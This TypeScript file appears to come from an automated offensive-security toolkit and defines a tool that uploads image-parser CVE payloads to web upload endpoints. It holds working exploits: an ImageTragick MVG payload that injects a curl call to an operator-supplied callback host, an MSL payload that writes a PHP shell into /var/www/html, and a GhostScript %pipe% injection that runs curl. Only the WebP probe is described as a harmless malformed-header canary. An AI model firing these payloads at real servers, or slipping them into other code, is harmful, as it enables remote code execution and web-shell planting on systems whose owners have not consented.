// T47 — image_parser_probe
// Curated payloads for image-parser CVEs: ImageTragick, GhostScript,
// libwebp (CVE-2023-4863), libjxl, mozjpeg.

import { ToolDefinition, ToolResult } from '../types';
import { CommandExecutor } from '../executor';

const definition: ToolDefinition = {
  name: 'image_parser_probe',
  description:
    'Fire curated image-parser CVE payloads at upload endpoints. Tests ImageTragick ' +
    '(CVE-2016-3714 MSL/MVG polyglot), GhostScript SAFER bypass, libwebp CVE-2023-4863 ' +
    '(heap overflow via malformed WebP), and libjxl OOM trigger. Detects server-side image ' +
    'processing libraries with known unpatched CVEs.',
  status: 'available',
  version: '1.0.0',
  parameters: [
    { name: 'url',            type: 'string', required: true,  description: 'Upload endpoint URL' },
    { name: 'upload_field',   type: 'string', required: false, description: 'File field name', default: 'file' },
    { name: 'target_parser',  type: 'string', required: false, description: 'auto | imagick | ghostscript | libwebp', default: 'auto' },
    { name: 'oob_host',       type: 'string', required: true,  description: 'OOB callback host for blind RCE confirmation' },
    { name: 'headers',        type: 'string', required: false, description: 'JSON extra headers (including auth)' },
    { name: 'timeout_ms',     type: 'number', required: false, description: 'Per-request timeout ms', default: 30000 },
  ],
};

function imagetragickMvg(oobHost: string): Buffer {
  const mvg = `push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.1/genesis|curl ${oobHost}/imagetragick-rce)'
pop graphic-context`;
  return Buffer.from(mvg);
}

function imagetragickMsl(oobHost: string): Buffer {
  const msl = `<?xml version="1.0" encoding="UTF-8"?>
<image>
<read filename="caption:&lt;?php system('curl ${oobHost}/imagetragick-msl'); ?&gt;"/>
<write filename="/var/www/html/genesis-shell.php"/>
</image>`;
  return Buffer.from(msl);
}

function ghostscriptPayload(oobHost: string): Buffer {
  const gs = `%!PS-Adobe-3.0 EPSF-3.0
%%BoundingBox: 0 0 100 100
/OutputFile (%pipe%curl ${oobHost}/ghostscript-rce) def
(genesis) OutputFile runpdfbegin
`;
  return Buffer.from(gs);
}

// Minimal malformed WebP header to trigger parser errors (safe canary, not actual CVE-2023-4863 exploit)
function webpCanary(): Buffer {
  return Buffer.from([
    0x52, 0x49, 0x46, 0x46,  // RIFF
    0xff, 0xff, 0xff, 0xff,  // file size (overflowed)
    0x57, 0x45, 0x42, 0x50,  // WEBP
    0x56, 0x50, 0x38, 0x4c,  // VP8L
    0xff, 0xff, 0xff, 0xff,  // chunk size (overflowed)
    0x2f, 0x00, 0x00, 0x00,  // VP8L signature
  ]);
}

function buildMultipart(fieldName: string, filename: string, content: Buffer, contentType: string): { body: Buffer; boundary: string } {
  const boundary = `----GENESISImageParser${Math.random().toString(36).slice(2, 8)}`;
  const head = `--${boundary}\r\nContent-Disposition: form-data; name="${fieldName}"; filename="${filename}"\r\nContent-Type: ${contentType}\r\n\r\n`;
  const tail = `\r\n--${boundary}--\r\n`;
  return { body: Buffer.concat([Buffer.from(head), content, Buffer.from(tail)]), boundary };
}

export const imageParserProbeTool = {
  definition,
  async execute(params: Record<string, unknown>, _exec: CommandExecutor): Promise<ToolResult> {
    const url = String(params.url || '');
    const uploadField = String(params.upload_field || 'file');
    const targetParser = String(params.target_parser || 'auto');
    const oobHost = String(params.oob_host || '');
    const timeoutMs = Number(params.timeout_ms || 30000);

    if (!url) return { output: 'url required', parsed: { error: 'missing_url' } };
    if (!oobHost) return { output: 'oob_host required', parsed: { error: 'missing_oob_host' } };

    let extraHeaders: Record<string, string> = { 'User-Agent': 'Mozilla/5.0 GENESIS/4.0' };
    try { if (params.headers) Object.assign(extraHeaders, JSON.parse(String(params.headers))); } catch { /* ignore */ }

    const probes = [
      { name: 'imagetragick_mvg',  file: 'image.jpg', content: imagetragickMvg(oobHost),   ct: 'image/jpeg',   parsers: ['imagick', 'auto'] },
      { name: 'imagetragick_msl',  file: 'image.msl', content: imagetragickMsl(oobHost),   ct: 'image/jpeg',   parsers: ['imagick', 'auto'] },
      { name: 'ghostscript_eps',   file: 'image.eps', content: ghostscriptPayload(oobHost), ct: 'image/eps',    parsers: ['ghostscript', 'auto'] },
      { name: 'webp_overflow',     file: 'image.webp', content: webpCanary(),               ct: 'image/webp',   parsers: ['libwebp', 'auto'] },
    ].filter(p => targetParser === 'auto' || p.parsers.includes(targetParser));

    const results: Array<{ name: string; status: number; interesting: boolean; note: string; error?: string }> = [];

    for (const probe of probes) {
      const start = Date.now();
      try {
        const { body, boundary } = buildMultipart(uploadField, probe.file, probe.content, probe.ct);
        const controller = new AbortController();
        const timer = setTimeout(() => controller.abort(), timeoutMs);
        const resp = await fetch(url, {
          method: 'POST',
          headers: { ...extraHeaders, 'Content-Type': `multipart/form-data; boundary=${boundary}` },
          body,
          signal: controller.signal,
        });
        clearTimeout(timer);
        const text = await resp.text();
        const interesting = resp.status >= 500 || /imagemagick|ghostscript|error|exception/i.test(text);
        results.push({ name: probe.name, status: resp.status, interesting, note: `${Date.now() - start}ms` });
      } catch (err) {
        results.push({ name: probe.name, status: 0, interesting: false, note: String(err), error: String(err) });
      }
    }

    const interesting = results.filter(r => r.interesting);
    const lines = [
      `image_parser_probe — ${probes.length} CVE payloads against ${url.substring(0, 80)}`,
      `OOB host: ${oobHost}  Target parser: ${targetParser}`,
      `Interesting responses: ${interesting.length}/${results.length}`,
      '─'.repeat(72),
    ];
    for (const r of results) {
      const flag = r.interesting ? '⚡ INTERESTING' : (r.error ? '✗ ERR        ' : '  ·          ');
      lines.push(`  ${flag}  [${r.name.padEnd(22)}]  status=${r.status}  ${r.note}`);
    }
    lines.push('');
    lines.push(`After upload, call oob_check(action=check) to verify ${oobHost} received callback`);

    return {
      output: lines.join('\n'),
      parsed: { probes_run: probes.length, interesting_count: interesting.length, interesting, results },
    };
  },
};
